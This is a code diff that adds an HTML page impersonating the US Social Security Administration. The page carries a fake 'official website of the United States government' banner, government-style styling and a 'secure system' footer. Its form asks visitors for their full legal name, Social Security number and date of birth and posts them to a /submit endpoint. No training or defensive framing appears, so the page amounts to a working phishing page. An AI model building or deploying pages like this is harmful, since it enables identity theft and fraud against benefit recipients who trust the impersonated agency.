@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Social Security Administration | Identity Verification</title>
+    <style>
+        body { font-family: "Source Sans Pro", "Helvetica Neue", Helvetica, Roboto, Arial, sans-serif; background-color: #f0f0f0; margin: 0; }
+        .gov-banner { background: #112e51; color: white; padding: 5px 20px; font-size: 12px; }
+        .container { max-width: 500px; margin: 50px auto; background: white; padding: 40px; border-top: 5px solid #005ea2; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
+        h1 { color: #1b1b1b; font-size: 24px; margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: bold; color: #333; }
+        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #71767a; border-radius: 4px; box-sizing: border-box; }
+        button { background-color: #005ea2; color: white; border: none; padding: 15px 25px; font-size: 16px; border-radius: 4px; cursor: pointer; width: 100%; }
+        button:hover { background-color: #1a4480; }
+        .footer-text { font-size: 12px; color: #555; text-align: center; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="gov-banner">An official website of the United States government</div>
+    <div class="container">
+        <h1>Verify Your Identity</h1>
+        <p>To access your Social Security benefits, please confirm your details.</p>
+        <form action="/submit" method="post">
+            <label for="name">Full Legal Name</label>
+            <input type="text" name="full_name" placeholder="John Doe" required>
+
+            <label for="ssn">Social Security Number (SSN)</label>
+            <input type="password" name="ssn" placeholder="XXX-XX-XXXX" required>
+
+            <label for="dob">Date of Birth</label>
+            <input type="text" name="dob" placeholder="MM/DD/YYYY" required>
+
+            <button type="submit">Verify Identity</button>
+        </form>
+        <p class="footer-text">This is a secure system. Privacy Act Statement applies.</p>
+    </div>
+</body>
+</html>
